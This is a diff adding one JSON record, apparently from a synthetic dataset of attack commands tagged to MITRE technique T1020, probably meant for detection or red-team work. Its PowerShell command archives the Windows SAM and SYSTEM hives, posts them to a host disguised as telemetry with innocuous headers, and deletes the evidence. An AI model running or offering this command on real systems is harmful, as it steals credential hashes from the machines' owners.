@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$ProgressPreference='SilentlyContinue'; $a=Join-Path $env:TEMP ('syscfg_'+(Get-Date -Format yyyyMMddHHmmss)+'.zip'); Compress-Archive -Path 'C:\\Windows\\System32\\config\\SAM','C:\\Windows\\System32\\config\\SYSTEM' -DestinationPath $a -Force; Invoke-WebRequest -Uri 'https://telemetry.example.com/upload/sys' -Method Post -InFile $a -ContentType 'application/octet-stream' -Headers @{ 'User-Agent'='Mozilla/5.0'; 'X-Host'=$env:COMPUTERNAME } -ErrorAction SilentlyContinue; Remove-Item $a -Force",
+  "explanation": "Archives SAM and SYSTEM hives and exfiltrates them via HTTPS POST using Invoke-WebRequest with benign-looking headers, suppressing progress output.",
+  "rationale_steps": [
+    "Bundle sensitive registry hive files requiring SYSTEM privileges.",
+    "POST the archive to a remote server using Invoke-WebRequest over HTTPS.",
+    "Set innocuous headers and suppress progress to reduce noise.",
+    "Remove the temporary archive to minimize local artifacts."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-ed594729-bd2cc090",
+  "source_prompt_hash": "ed594729",
+  "timestamp_utc": "2025-09-30T09:16:21.768830Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
